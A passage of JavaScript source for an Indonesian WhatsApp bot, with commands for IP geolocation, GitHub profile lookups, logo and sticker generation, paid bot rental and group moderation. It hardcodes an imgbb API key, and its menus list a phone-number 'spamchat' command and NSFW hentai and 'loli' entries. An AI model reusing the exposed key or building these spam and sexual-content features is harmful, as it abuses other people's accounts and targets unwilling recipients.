if (args.length < 1) return reply(`Gini, ${prefix + command} 114.142.169.38`)
ipny = body.slice(9)
anu = await fetchJson(`https://api.lolhuman.xyz/api/ipaddress/${ipny}?apikey=${lolkey}`)
tekss = `☠️lacak ip☠️\n✍️Negara : ${anu.result.country}\n✍️Kota : ${anu.result.city} (${anu.result.regionName})\n✍️ISP : ${anu.result.isp}`
yusufz.sendMessage(from, tekss, text, {quoted: mek1})
break
// ke 77
case 'ssweb':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} https://spybot-api.herokuapp`)
wbny = body.slice(7)
reply(`✍️Tunggu....`)
anu = await getBuffer(`https://api.lolhuman.xyz/api/ssweb?apikey=${lolkey}&url=${wbny}`)
weem = `✍️${namabot}`
yusufz.sendMessage(from, anu, image, {quoted: mek1, caption: weem})
break
// ke 78
// tolong jangan nyolong
// nyolong? izin
// kontak? ada diatas palingggg atasss
// diawal
case 'githubstalk':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} https://github.com/yusu0`)
teksdia = body.slice(13)
reply(`🐧Tunggu bang...`)
anu = await fetchJson(`https://api.lolhuman.xyz/api/github/${teksdia}?apikey=${lolkey}`)
buff = await getBuffer(`${anu.result.avatar}`)
tekss = `🐧Github Stalking🐧\n✍️Link : ${anu.result.url}\n✍️Nama : ${anu.result.nama}\n✍️Followers : ${anu.result.followers}\n✍️Difollow : ${anu.result.following}\n✍️Publik Repostori : ${anu.result.public_repos}\n✍️Jenis : ${anu.result.type}\n✍️Bio : ${anu.result.bio}\n🐧${namabot}🐧`
yusufz.sendMessage(from, buff, image, {quoted: mek1, caption: tekss})
break
// ke 79
case 'sewa':

              if (!isGroup)return reply(`Khusus Grup`)
              if (!isOwner) return reply(`Khusus Owner Anj`)
              if (args.length < 1) return reply(`Penggunaan :\n*${prefix}sewa* add/del waktu\nDihitung miliseconds jadi kalau lu ketik 24 gk akan 24 jam, kenapa? karena itu miliseconds`)

              if (args[0].toLowerCase() === 'add'){

            _sewa.addSewaGroup(from, args[1], sewa)

              reply(`Success`)

              } else if (args[0].toLowerCase() === 'del'){

              sewa.splice(_sewa.getSewaPosition(from, sewa), 1)

              fs.writeFileSync('./src/sewa.json', JSON.stringify(sewa))

              reply(`Berhasil!`)
              } else {

              reply(`Penggunaan :\n*${prefix}sewa* add/del waktu\nDihitung miliseconds jadi kalau lu ketik 24 gk akan 24 jam, kenapa? karena itu miliseconds`)

}

              break
// ke 80
// capek
case 'sewabot':
buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
manu = `Hai ${pushname} 👋\nSilahkan pilih :`
but = [
          { buttonId: `${prefix}1minggu`, buttonText: { displayText: '1 Minggu' }, type: 1 },
          { buttonId: `${prefix}1bulan`, buttonText: { displayText: '1 Bulan' }, type: 1 },
          { buttonId: `${prefix}5hari`, buttonText: { displayText: '5 Hari' }, type: 1 }
        ]
        sendButImage(from, manu, trans, buff, but)
break
case '1minggu':
buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
manu = `Hai ${pushname} 👋\n✍️ 1 minggu : 10k\nSilahkan pilih metode pembayaran :`
but = [
          { buttonId: `${prefix}viadana`, buttonText: { displayText: '☠️DANA' }, type: 1 },
          { buttonId: `${prefix}viagopay`, buttonText: { displayText: '☠️GOPAY' }, type: 1 },
          { buttonId: `${prefix}viapulsa`, buttonText: { displayText: '☠️PULSA' }, type: 1 }
        ]
        sendButImage(from, manu, trans, buff, but)
break
case '1bulan':
buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
manu = `Hai ${pushname} 👋\n✍️ 1 bulan : 20k\nSilahkan pilih metode pembayaran :`
but = [
          { buttonId: `${prefix}viadana`, buttonText: { displayText: '☠️DANA' }, type: 1 },
          { buttonId: `${prefix}viagopay`, buttonText: { displayText: '☠️GOPAY' }, type: 1 },
          { buttonId: `${prefix}viapulsa`, buttonText: { displayText: '☠️PULSA' }, type: 1 }
        ]
        sendButImage(from, manu, trans, buff, but)
break
case '5hari':
buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
manu = `Hai ${pushname} 👋\n✍️ 5 hari : 5k\nSilahkan pilih metode pembayaran :`
but = [
          { buttonId: `${prefix}viadana`, buttonText: { displayText: '☠️DANA' }, type: 1 },
          { buttonId: `${prefix}viagopay`, buttonText: { displayText: '☠️GOPAY' }, type: 1 },
          { buttonId: `${prefix}viapulsa`, buttonText: { displayText: '☠️PULSA' }, type: 1 }
        ]
        sendButImage(from, manu, trans, buff, but)
break

// ke 81
// awokawok gw ngakalin
// ngambil? izin ajg
case 'sticker':
case 's':
case 'stiker':
case 'setiker':
if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(`Wait Bang`)
	  owgi = await yusufz.downloadAndSaveMediaMessage(ted)
	  anu = await imgbb("6cc42a6d77db20412c6ecb304dc4dc31", owgi)
	  mengbuff = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebpauthor?apikey=${lolkey}&img=${anu.display_url}&package=${namabot}&author=${namaown}`)
	yusufz.sendMessage(from, mengbuff, sticker, {quoted: mek1})
	} else {
	  reply(`Kirim foto dengan caption ${prefix + command}`)
	}
break
// ke 82
case 'hacker':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} SpyBot`)
// kalau lu pengen buat sesuatu kaya respon gitu lewat sini
// =>
namadie = body.slice(8)
buff = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/anonymhacker?apikey=${lolkey}&text=${namadie}`)
tekss = `☠️Made By ${namabot}`
trans = `${footertext}!`
                          but = [
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♚ DONASI' }, type: 1 },
          { buttonId: `${prefix}sewabot`, buttonText: { displayText: '♞ SEWA BOT' }, type: 1 }
        ]
        sendButImage(from, tekss, trans, buff, but)
           break

// ke 83
case 'fpslogo':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} SpyBot`)
teksnya = body.slice(9)
reply(`Tunggu Sebentar abang proplayer🗿👌`)
buff = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/fpslogo?apikey=${lolkey}&text=${teksnya}`)
ysfz = `🐧${namabot}`
yusufz.sendMessage(from, buff, image, {quoted: mek1, caption: ysfz})
break
// ke 84
case 'logogaming':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} SpyBot`)
teksnya = body.slice(12)
reply(`Tunggu Sebentar abang proplayer🗿👌`)
buff = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/logogaming?apikey=${lolkey}&text=${teksnya}`)
ysfz = `🐧${namabot}`
yusufz.sendMessage(from, buff, image, {quoted: mek1, caption: ysfz})
break
// ke 85
case 'silverplaybutton':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} SpyBot`)
teksnya = body.slice(18)
reply(`Tunggu Sebentar bang🗿👌`)
buff = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/silverplaybutton?apikey=${lolkey}&text=${teksnya}`)
ysfz = `_🐧${namabot}_`
yusufz.sendMessage(from, buff, image, {quoted: mek1, caption: ysfz})
break
// ke 86
case 'goldplaybutton':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} SpyBot`)
teksnya = body.slice(16)
reply(`Tunggu Sebentar bang🗿👌`)
buff = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/goldplaybutton?apikey=${lolkey}&text=${teksnya}`)
ysfz = `_🐧${namabot}_`
yusufz.sendMessage(from, buff, image, {quoted: mek1, caption: ysfz})
break
// ke 87
case 'request':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} Script Bot`)
teksnya = body.slice(9)
lebahsk = `✍️Request Terbaru\n☠️Nama : ${pushname}\n☠️Pesan : ${teksnya}`
yusufz.sendMessage(`${numown}@s.whatsapp.net`, lebahsk, text, {quoted: mek1})
reply(`Request Anda Berhasil Dikirim Ke Owner`)
break
// ke 88
case 'bugreport':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} bug cintaku padanya`)
teksnya = body.slice(11)
lebahsk = `✍️Laporan Bug Terbaru\n☠️Nama : ${pushname}\n☠️Pesan : ${teksnya}`
yusufz.sendMessage(`${numown}@s.whatsapp.net`, lebahsk, text, {quoted: mek1})
reply(`Request Anda Berhasil Dikirim Ke Owner`)
break
// ke 89
case 'harrypotter':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} SpyBot`)
ysfz = body.slice(13)
reply(`✍️Tunggu Sebentar...`)
buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/harrypotter?apikey=${lolkey}&text=${ysfz}`)
wmn = `🐧${namabot}`
yusufz.sendMessage(from, buff, image, {quoted: mek1, caption: wmn})
break
// ke 90
case 'watercolor':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} SpyBot`)
ysfz = body.slice(12)
reply(`✍️Tunggu Sebentar...`)
buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/watercolor?apikey=${lolkey}&text=${ysfz}`)
wmn = `🐧${namabot}`
yusufz.sendMessage(from, buff, image, {quoted: mek1, caption: wmn})
break
// 91
case 'breakwall':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} SpyBot`)
ysfz = body.slice(11)
reply(`✍️Tunggu Sebentar...`)
buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/breakwall?apikey=${lolkey}&text=${ysfz}`)
wmn = `🐧${namabot}`
yusufz.sendMessage(from, buff, image, {quoted: mek1, caption: wmn})
break
// ke 92
case 'hallowen':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} SpyBot`)
ysfz = body.slice(10)
reply(`✍️Tunggu Sebentar...`)
buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/halloween?apikey=${lolkey}&text=${ysfz}`)
wmn = `🐧${namabot}`
yusufz.sendMessage(from, buff, image, {quoted: mek1, caption: wmn})
break
// ke 93
case 'jokerlogo':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} SpyBot`)
ysfz = body.slice(11)
reply(`✍️Tunggu Sebentar...`)
buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/jokerlogo?apikey=${lolkey}&text=${ysfz}`)
wmn = `🐧${namabot}`
yusufz.sendMessage(from, buff, image, {quoted: mek1, caption: wmn})
break
// ke 94
case 'cogan':
if (isBanned) return reply(mess.only.benned)
reply(`✍️Tunggu Sebentar....`)
buff = await getBuffer(`https://api.lolhuman.xyz/api/random/cogan?apikey=${lolkey}`)
wmn = `🐧${namabot}`
trans = `${footertext}!`
but = [
          { buttonId: `${prefix}cogan`, buttonText: { displayText: '👉LANJUT' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 }
        ]
        sendButImage(from, wmn, trans, buff, but)
break
// ke 95
case 'cecan':
if (isBanned) return reply(mess.only.benned)
reply(`✍️Tunggu Sebentar....`)
buff = await getBuffer(`https://api.lolhuman.xyz/api/random/cecan?apikey=${lolkey}`)
wmn = `🐧${namabot}`
trans = `${footertext}!`
but = [
          { buttonId: `${prefix}cecan`, buttonText: { displayText: '👉LANJUT' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 }
        ]
        sendButImage(from, wmn, trans, buff, but)
break
// ke 96
case 'husbu':
if (isBanned) return reply(mess.only.benned)
reply(`✍️Tunggu Sebentar....`)
buff = await getBuffer(`https://api.lolhuman.xyz/api/random/husbu?apikey=${lolkey}`)
wmn = `🐧${namabot}`
trans = `${footertext}!`
but = [
          { buttonId: `${prefix}husbu`, buttonText: { displayText: '👉LANJUT' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 }
        ]
        sendButImage(from, wmn, trans, buff, but)
break
// ke 97
case 'wallanime':
if (isBanned) return reply(mess.only.benned)
reply(`✍️Tunggu Sebentar....`)
buff = await getBuffer(`https://api.lolhuman.xyz/api/random/wallnime?apikey=${lolkey}`)
wmn = `🐧${namabot}`
trans = `${footertext}!`
but = [
          { buttonId: `${prefix}wallanime`, buttonText: { displayText: '👉LANJUT' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 }
        ]
        sendButImage(from, wmn, trans, buff, but)
break
// ke 98
case 'bts':
if (isBanned) return reply(mess.only.benned)
reply(`✍️Tunggu Sebentar....`)
buff = await getBuffer(`https://api.lolhuman.xyz/api/random/bts?apikey=${lolkey}`)
wmn = `🐧${namabot}`
trans = `${footertext}!`
but = [
          { buttonId: `${prefix}bts`, buttonText: { displayText: '👉LANJUT' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 }
        ]
        sendButImage(from, wmn, trans, buff, but)
break
// ke 99
case 'exo':
if (isBanned) return reply(mess.only.benned)
reply(`✍️Tunggu Sebentar....`)
buff = await getBuffer(`https://api.lolhuman.xyz/api/random/exo?apikey=${lolkey}`)
wmn = `🐧${namabot}`
trans = `${footertext}!`
but = [
          { buttonId: `${prefix}exo`, buttonText: { displayText: '👉LANJUT' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 }
        ]
        sendButImage(from, wmn, trans, buff, but)
break
// ke 100
// uh capek:v
case 'ppcouple':
if (isBanned) return reply(mess.only.benned)
reply(`✍️Tunggu Sebentar....`)
buff = await getBuffer(`https://api.lolhuman.xyz/api/random/ppcouple?apikey=${lolkey}`)
wmn = `🐧${namabot}`
trans = `${footertext}!`
but = [
          { buttonId: `${prefix}ppcouple`, buttonText: { displayText: '👉LANJUT' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 }
        ]
        sendButImage(from, wmn, trans, buff, but)
break
// ke 101
case 'stickbucin':
if (isBanned) return reply(mess.only.benned)
reply(`✍️Tunggu Sebentar....`)
buff = await getBuffer(`https://api.lolhuman.xyz/api/random/bucinstick?apikey=${lolkey}`)
wmn = `🐧${namabot}`
yusufz.sendMessage(from, buff, sticker, {quoted: mek1})
break
// ke 102
case 'play':
if (isBanned) return reply(mess.only.benned)
ysfz = body.slice(6)
reply(`✍️Tunggu Sebentar....`)
anu = await fetchJson(`https://api.lolhuman.xyz/api/ytplay?apikey=${lolkey}&query=${ysfz}`)
gmbrn = await getBuffer(`${anu.result.info.thumbnail}`)
aduio = await getBuffer(`${anu.result.audio.link}`)
tekssnya = `Judul : ${anu.result.info.title}\n✍️Durasi : ${anu.result.info.duration}\n\n_Audio Akan Dikirimkan, Mohon Tunggu....._`
yusufz.sendMessage(from, gmbrn, image, {quoted: mek1, caption: tekssnya})
yusufz.sendMessage(from, aduio, audio, {quoted: mek1})
break
case 'ngetesbutt':
res = await yusufz.prepareMessageFromContent(from,{
"listMessage": {
"title": `\`\`\`Hi ${pushname} 👋.\`\`\``,
"description": `\`\`\`Use The Bot As Best You Can And Dont Misuse The Bot Feature\`\`\``,
"buttonText": `Hahaha`,
"listType": "SINGLE_SELECT",
"sections": [
{
"title": `Silahkan Pilih Gan`,
"rows": [
{
"title": "Banned",
"rowId": ".Banned"
}
]
}
]
}
}, {quoted:mek})
yusufz.relayWAMessage(res)
break
// ke 103
case 'allmenu':
buff = fs.readFileSync(`${thumb}`)
thu = await yusufz.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
groups = yusufz.chats.array.filter(v => v.jid.endsWith('g.us'))
privat = yusufz.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
uptime = process.uptime();
timestampe = speed();
totalChat = await yusufz.chats.all()
latensie = speed() - timestampe

menu =`${namabot}



${ucapanWaktu} ${pushname} 👋

「 𝑪𝑨𝑳𝑬𝑵𝑫𝑨𝑹 」

🐥 Day : ${week} ${weton} 
🐥 Date : ${date}


📝「 𝑩𝑶𝑻 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 」



▹ Speed : *${latensie.toFixed(4)} _Second_*

▹ Active : *${runtime}*

▹ Platfrom : *Android*

▹ Total Chats : ${totalChat}

👤 「 𝒀𝑶𝑼𝑹 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 」



▹ Username: *${pushname}*

▹ Sender : *@${sender.split('@')[0]}*

▹ Bio Info : *${thu.status}*

▹ Premium : *${isPrem ? 'Ya' : 'No'}*

▹ Admin : *${isGroupAdmins ? 'Ya' : 'No'}*


「 𝐀𝑳𝑳 𝐌𝐄𝐍𝐔 」

 「 GROUP 𝐌𝐄𝐍𝐔 」
    ${prefix}welcome *on otomatis*
    ${prefix}antilink *button*
    ${prefix}add *nomornya*
    ${prefix}kick @tag
    ${prefix}setdesc
    ${prefix}linkgrup
    ${prefix}setname
    ${prefix}grup tutup/buka

「 MAKER 𝐌𝐄𝐍𝐔 」
    ${prefix}shortlink
    ${prefix}neontext 
    ${prefix}art-quote 
    ${prefix}summer 
    ${prefix}ttp 
    ${prefix}ttp1 
    ${prefix}ttp2 
    ${prefix}ttp3 
    ${prefix}attp 
    ${prefix}attp1 
    ${prefix}nulis 
    ${prefix}kodeqrmaker 
    ${prefix}infokodeqr 
    ${prefix}marvelmaker namalu|namalu 
    ${prefix}pornhub namalu|namalu 
    ${prefix}avenger namalu|namalu 
    ${prefix}ninjalogo namalu|namalu 
    ${prefix}blackpink 
    ${prefix}greenneon 
    ${prefix}futureneon
    ${prefix}sandwriting 
    ${prefix}triggered 
    ${prefix}removebg 
    ${prefix}burik 
    ${prefix}ripmaker 
    ${prefix}trash 
    ${prefix}sticker 
    ${prefix}hacker <namalu> 
    ${prefix}fpslogo 
    ${prefix}silverplaybutton 
    ${prefix}goldplaybutton 
    ${prefix}harrypotter 
    ${prefix}watercolor 
    ${prefix}breakwall 
    ${prefix}hallowen 
    ${prefix}jokerlogo
    
    「 RANDOMENU 𝐌𝐄𝐍𝐔 」
    ${prefix}apakah <pertanyaan>
    ${prefix}kapankah <pertanyaan>
    ${prefix}losiapa
    ${prefix}quotes 
    ${prefix}quotesislami
    ${prefix}meme 
    ${prefix}wallpaper
    ${prefix}stickpatrick
    ${prefix}dadu
    ${prefix}amongus 
    ${prefix}stickdog 
    ${prefix}gawrgura
    ${prefix}quotesimage
    ${prefix}randomanime
    ${prefix}ceritahoror
    ${prefix}darkjokes
    ${prefix}cogan
    ${prefix}cecan
    ${prefix}ppcouple
    ${prefix}bts
    ${prefix}exo
    ${prefix}stickbucin 
    ${prefix}husbu
    ${prefix}wallnime
    



Jangan Lupa Follow: instagram.com/wardah_alieyna/ `
trans = `${footertext}`
but = [
          { buttonId: `${prefix}owner`, buttonText: { displayText: '♚ OWNER' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 },
          { buttonId: `${prefix}sewabot`, buttonText: { displayText: '❁ SEWA BOT' }, type: 1 }
        ]
        sendButImage(from, menu, trans, buff, but)
        break
// ke 104
case 'listmenubutt':
buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
manu = `^.^ ░░░[ WELCOME ]░░░ ^.^\n- BOT Made By ${namaown}\n\nSilahkan Pilih Menunya Ya Kak`
                          but = [
          { buttonId: `${prefix}makermenu`, buttonText: { displayText: '♚ MAKER MENU' }, type: 1 },
          { buttonId: `${prefix}downloadmenu`, buttonText: { displayText: '♞ DOWNLOAD MENU' }, type: 1 },
          { buttonId: `${prefix}listmenubutt2`, buttonText: { displayText: '👉MENU SELANJUTNYA' }, type: 1 }
        ]
        sendButImage(from, manu, trans, buff, but)
break
case 'listmenubutt2':
buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
manu = `^.^ ░░░[ WELCOME ]░░░ ^.^\n- BOT Made By ${namaown}\n\nSilahkan Pilih Menunya Ya Kak`
                          but = [
          { buttonId: `${prefix}groupmenu`, buttonText: { displayText: '♚ GRUP MENU' }, type: 1 },
          { buttonId: `${prefix}ownermenu`, buttonText: { displayText: '♞ OWNER MENU' }, type: 1 },
          { buttonId: `${prefix}listmenubutt3`, buttonText: { displayText: '👉MENU SELANJUTNYA' }, type: 1 }
        ]
        sendButImage(from, manu, trans, buff, but)
break
case 'randomenu':
buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
manu = `Hai ${pushname} 👋\n✍️Jenis user : ${premi}\n\n╔─── ¤ ◎ RANDOM MENU ◎ ¤ ───╗\n- ${prefix}apakah <pertanyaan>\n- ${prefix}kapankah <pertanyaan>\n- ${prefix}losiapa\n- ${prefix}quotes\n- ${prefix}quotesislami\n- ${prefix}meme\n- ${prefix}wallpaper\n- ${prefix}stickpatrick\n- ${prefix}dadu\n- ${prefix}amongus\n- ${prefix}stickdog\n- ${prefix}gawrgura\n- ${prefix}quotesimage\n- ${prefix}randomanime\n- ${prefix}ceritahoror\n- ${prefix}darkjokes\n- ${prefix}cogan\n- ${prefix}cecan\n- ${prefix}ppcouple\n- ${prefix}bts\n- ${prefix}exo\n- ${prefix}stickbucin\n- ${prefix}husbu\n- ${prefix}wallnime`
but = [
          { buttonId: `${prefix}owner`, buttonText: { displayText: '♚ OWNER' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 },
          { buttonId: `${prefix}sewabot`, buttonText: { displayText: '✍️ SEWA BOT' }, type: 1 }
        ]
        sendButImage(from, manu, trans, buff, but)
break
case 'makermenu':
buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
manu = `Hai ${pushname} 👋\n✍️Jenis user : ${premi}\n\n»»——- ★ MAKER ★ ——-««\n- ${prefix}shortlink\n- ${prefix}neontext\n- ${prefix}art-quote\n- ${prefix}summer\n- ${prefix}ttp\n- ${prefix}ttp1\n- ${prefix}ttp2\n- ${prefix}ttp3\n- ${prefix}attp\n- ${prefix}attp1\n- ${prefix}nulis\n- ${prefix}kodeqrmaker\n- ${prefix}infokodeqr\n- ${prefix}marvelmaker namalu|namalu\n- ${prefix}pornhub namalu|namalu\n- ${prefix}avenger namalu|namalu\n- ${prefix}ninjalogo namalu|namalu\n- ${prefix}blackpink\n- ${prefix}greenneon\n- ${prefix}futureneon\n - ${prefix}sandwriting\n- ${prefix}triggered\n- ${prefix}removebg\n- ${prefix}burik\n- ${prefix}ripmaker\n- ${prefix}trash\n- ${prefix}sticker\n- ${prefix}hacker <namalu>\n- ${prefix}fpslogo\n- ${prefix}silverplaybutton\n- ${prefix}goldplaybutton\n- ${prefix}harrypotter\n- ${prefix}watercolor\n- ${prefix}breakwall\n- ${prefix}hallowen\n- ${prefix}jokerlogo`
but = [
          { buttonId: `${prefix}owner`, buttonText: { displayText: '♚ OWNER' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 },
          { buttonId: `${prefix}sewabot`, buttonText: { displayText: '✍️ SEWA BOT' }, type: 1 }
        ]
        sendButImage(from, manu, trans, buff, but)
break
case 'downloadmenu':
buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
manu = `Hai ${pushname} 👋\n✍️Jenis user : ${premi}\n\n»»————- ★ DOWNLOADER ★ ————-««\n- ${prefix}ytmp3 <linkyt>\n- ${prefix}tiktoknowm (linkvideo)\n- ${prefix}play`
but = [
          { buttonId: `${prefix}owner`, buttonText: { displayText: '♚ OWNER' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 },
          { buttonId: `${prefix}sewabot`, buttonText: { displayText: '✍️ SEWA BOT' }, type: 1 }
        ]
        sendButImage(from, manu, trans, buff, but)
break
case 'listmenubutt3':
buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
manu = `^.^ ░░░[ WELCOME ]░░░ ^.^\n- BOT Made By ${namaown}\n\nSilahkan Pilih Menunya Ya Kak`
                          but = [
          { buttonId: `${prefix}animemenu`, buttonText: { displayText: '♚ ANIME MENU' }, type: 1 },
          { buttonId: `${prefix}othermenu`, buttonText: { displayText: '♞ OTHERS MENU' }, type: 1 },
        ]
        sendButImage(from, manu, trans, buff, but)
break
case 'animemenu':
buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
manu = `Hai ${pushname} 👋\n✍️Jenis user : ${premi}\n\n»»——- ★ ANIME ★ ——-««\n- ${prefix}hentaigif\n- ${prefix}yuri\n- ${prefix}neko\n- ${prefix}loli\n - ${prefix}nsfwhentaigif\n- ${prefix}waifu\n- ${prefix}whatanime`
but = [
          { buttonId: `${prefix}owner`, buttonText: { displayText: '♚ OWNER' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 },
          { buttonId: `${prefix}sewabot`, buttonText: { displayText: '✍️ SEWA BOT' }, type: 1 }
        ]
        sendButImage(from, manu, trans, buff, but)
break
case 'grupmenu':
case 'groupmenu':
buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
manu = `Hai ${pushname} 👋\n✍️Jenis user : ${premi}\n\n»»——- ★ GROUP ★ ——-««\n- ${prefix}grup tutup/buka\n- ${prefix}setname <teks>\n- ${prefix}setdesc <teks>\n- ${prefix}linkgrup`
but = [
          { buttonId: `${prefix}owner`, buttonText: { displayText: '♚ OWNER' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 },
          { buttonId: `${prefix}sewabot`, buttonText: { displayText: '✍️ SEWA BOT' }, type: 1 }
        ]
        sendButImage(from, manu, trans, buff, but)
break
case 'ownermenu':
buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
manu = `Hai ${pushname} 👋\n✍️Jenis user : ${premi}\n\n»»——- ★ OWNER ★ ——-««\n- ${prefix}bc <teks>\n- ${prefix}setprefix\n- ${prefix}ownleave\n- ${prefix}addprem <nomor>\n- ${prefix}dellprem <nomor>\n- ${prefix}ban <nomor>\n- ${prefix}unban <nomor>\n- ${prefix}shutdown\n- ${prefix}sewa add/del waktu`
but = [
          { buttonId: `${prefix}owner`, buttonText: { displayText: '♚ OWNER' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 },
          { buttonId: `${prefix}sewabot`, buttonText: { displayText: '✍️ SEWA BOT' }, type: 1 }
        ]
        sendButImage(from, manu, trans, buff, but)
break
case 'othermenu':
case 'othersmenu':
buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
manu = `Hai ${pushname} 👋\n✍️Jenis user : ${premi}\n\n»»——- ★ OTHERS ★ ——-««\n- ${prefix}encode\n- ${prefix}decode\n- ${prefix}speed\n- ${prefix}donasi\n- ${prefix}simi\n- ${prefix}kisahnabi\n- ${prefix}lacakip\n- ${prefix}ssweb\n- ${prefix}githubstalk\n- ${prefix}sewabot\n- ${prefix}request\n- ${prefix}bugreport\n- ${prefix}spamchat 081234567|pesanlu`
but = [
          { buttonId: `${prefix}owner`, buttonText: { displayText: '♚ OWNER' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 },
          { buttonId: `${prefix}sewabot`, buttonText: { displayText: '✍️ SEWA BOT' }, type: 1 }
        ]
        sendButImage(from, manu, trans, buff, but)
break
case 'info':
case 'informasi':
tekss = `Hai ${pushname} 👋\n\n✍️Script Made By NYX\n☠️Version : 2.13\n🐧Channel YT : https://youtube.com/channel/ITSMENYX:)\n*Subscribe For New Update!*`
trans = `${footertext}`
but = [
{ buttonId: '.donasi', buttonText: { displayText: '✍️ DONASI' }, type: 1 }
]
sendButton(from, tekss, trans, but, mek)
break
case 'antilink' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
trans = `${footertext}`
but = [
          { buttonId: `${prefix}antilinkon`, buttonText: { displayText: 'Aktifkan' }, type: 1 },
          { buttonId: `${prefix}antilinkoff`, buttonText: { displayText: 'Matikan' }, type: 1 }
        ]
sendButton(from, "Silahkan pilih untuk antilink group", trans, but, mek)
break
case 'add' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (args.length < 1) return reply('Yang mau di add siapa??')
if (args[0].startsWith('08')) return reply('Gunakan kode negara!')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
yusufz.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
reply('Gagal menambahkan target, mungkin karena di private')
}
break
case 'kick' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, mengeluarkan :\n'
for (let _ of mentioned) {
